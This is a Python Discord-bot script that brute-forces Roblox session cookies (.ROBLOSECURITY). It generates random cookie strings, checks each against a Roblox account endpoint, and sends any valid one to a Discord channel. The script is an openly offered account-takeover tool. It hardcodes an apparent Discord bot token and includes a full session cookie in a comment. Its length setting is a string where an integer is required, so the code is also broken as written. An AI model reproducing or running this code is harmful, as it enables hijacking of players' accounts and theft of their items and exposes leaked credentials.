#before installation
 #pip istall discord
 #pip install requests
import discord
import requests
import string
import random
import time
import asyncio
from discord.ext import commands
# config
channel_id = 871782698102952028
token = 'MTA2MTYzMzg4NDU3MzQxMzQwNg.GRCLl0.-ts3ZrZuFTmg6fDmAorbrrjO5r7BDyrQTaa8R8'
len = '732'
# end config
class MyClient(discord.Client):

    def __init__(self, *args, **kwargs):
            super().__init__(*args, **kwargs)

    async def setup_hook(self) -> None:
            # create the background task and run it in the background
            self.bg_task = self.loop.create_task(self.my_background_task())
    async def on_ready(self):
            print(f'Logged in as {self.user} (ID: {self.user.id})')
            print('------')
    async def my_background_task(self):
            await self.wait_until_ready()
            counter = 0
            channel = self.get_channel(channel_id)
            while not self.is_closed():
                cookies = []
                intro = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
                letters = 'ABCDEF'
                cookies = intro + ''.join(random.choices(letters + string.digits, k=len))
                req = requests.Session()
                #cookie = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_7A9722ABB36CB5DC5A31F539EB7017657601913A693F7A4EC4C03218BF5D401EAB585D9157AE2E3A35BC4E96F4FF1B612DA1C15A74779AFF3FF927BD995D187F33ECBF2FF533CD3D9B90760D1A2D2FAA5EA046EC12CF42625BD0ED7AEE34B5F716F71D20682C907D16AB3572EEEFB0056920E6BCDD3A1E42385A6D1F740063E1C9AD5A84C89BF8926937E5D4FC39496BE86059A5B5DA584EE57FFDB98D0262A538DFF646858902EAB68361EA81B6AF1C7BF56A48DDFC56ABF6239BA2A641ACCBB0CBE0D3765428A2307042C00DE7CDC875669923450B488D4C4AA3115509E80344C9AADE68D2B74C86D5668B4781F47437CCFCDCAE0A165EDE3C4FF2F47FA7683E9CE42FD8D6F0A441119EDB16160F103A5426EC5E485A97EEC12ED331A542070B949B0540DF2F8F2475E7AFA2EA54D90563E3088AA0803069BC354F7924064B1BABCF81FD7900A6EE2CEB07858B1FE5193B40286EBCEF43B4083F11427F7D9371376D56DCA4FEE15DA64509F6809076C77A55E1'
                cookie = cookies
                check = req.get('https://accountinformation.roblox.com/v1/birthdate',
                                    cookies={'.ROBLOSECURITY': str(cookie)})
                if check.status_code == 200:
                        print("\n     Valid\n\n" + cookie)
                        await channel.send(cookie)
                #else:
                    #print("\n     Not valid!\n\n")
                await asyncio.sleep(1)

client = MyClient(intents=discord.Intents.default())
client.run(token)